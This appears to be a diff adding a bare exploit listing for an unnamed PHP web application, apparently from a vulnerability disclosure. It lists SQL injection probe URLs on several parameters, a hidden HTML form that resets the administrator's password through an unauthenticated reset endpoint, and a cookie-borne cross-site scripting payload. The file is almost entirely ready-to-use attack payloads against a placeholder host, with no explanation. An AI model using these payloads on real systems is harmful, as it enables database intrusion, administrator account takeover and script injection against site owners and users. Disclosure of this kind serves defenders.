@@ -1,0 +1,20 @@
+Sql-injection:
+
+http://[host]/index.php?action=attachment&amp;file_name=%27
+http://[host]/index.php?action=show_comment&amp;post=%27
+http://[host]/index.php?action=rssfeed&amp;type=entry&amp;sys-name=%27
+http://[host]/index.php?action=view&amp;sys-name=%27
+
+Security-bypass:
+
+&lt;form action=&quot;http://[host]/as/index.php?type=password&amp;mod=resetok&quot; method=&quot;post&quot;&gt;
+&lt;input name=&quot;p1&quot; type=&quot;hidden&quot; value=&quot;123&quot;&gt;
+&lt;input name=&quot;p2&quot; type=&quot;hidden&quot; value=&quot;123&quot;&gt;
+&lt;input name=&quot;email&quot; type=&quot;hidden&quot; value=&quot;[admin_email]&quot;&gt;
+&lt;input value=&quot;Login&quot; name=&quot;login&quot; type=&quot;submit&quot;&gt;
+&lt;/form&gt;
+
+Cross-site Scripting:
+
+GET /as/index.php HTTP/1.1
+Cookie: top_height=&#039;)%3B&quot;&gt;&lt;script&gt;alert(&#039;XSS&#039;)%3B&lt;/script&gt;;
